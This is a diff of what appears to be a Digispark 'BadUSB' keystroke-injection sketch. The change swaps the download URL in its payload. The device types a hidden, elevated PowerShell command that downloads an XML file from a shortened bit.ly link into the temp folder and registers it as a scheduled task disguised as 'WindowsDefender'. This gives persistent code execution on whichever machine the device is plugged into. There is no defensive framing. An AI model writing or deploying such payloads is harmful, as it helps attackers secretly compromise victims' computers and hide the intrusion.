@@ -16,7 +16,7 @@ void loop() {
 
   DigiKeyboard.delay(1000);
 
-  DigiKeyboard.print("powershell saps powershell -ArgumentList \\\"`$client = New-Object System.Net.WebClient; `$client.DownloadFile('http://bit.ly/2jfL69K', `$env:temp + '\\s.xml');sleep 5;schtasks /create /XML `$env:temp\\s.xml /tn WindowsDefender\\\" -WindowStyle Hidden -Verb RunAs");
+  DigiKeyboard.print("powershell saps powershell -ArgumentList \\\"`$client = New-Object System.Net.WebClient; `$client.DownloadFile('http://bit.ly/2z3FmWI', `$env:temp + '\\s.xml');sleep 5;schtasks /create /XML `$env:temp\\s.xml /tn WindowsDefender\\\" -WindowStyle Hidden -Verb RunAs");
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
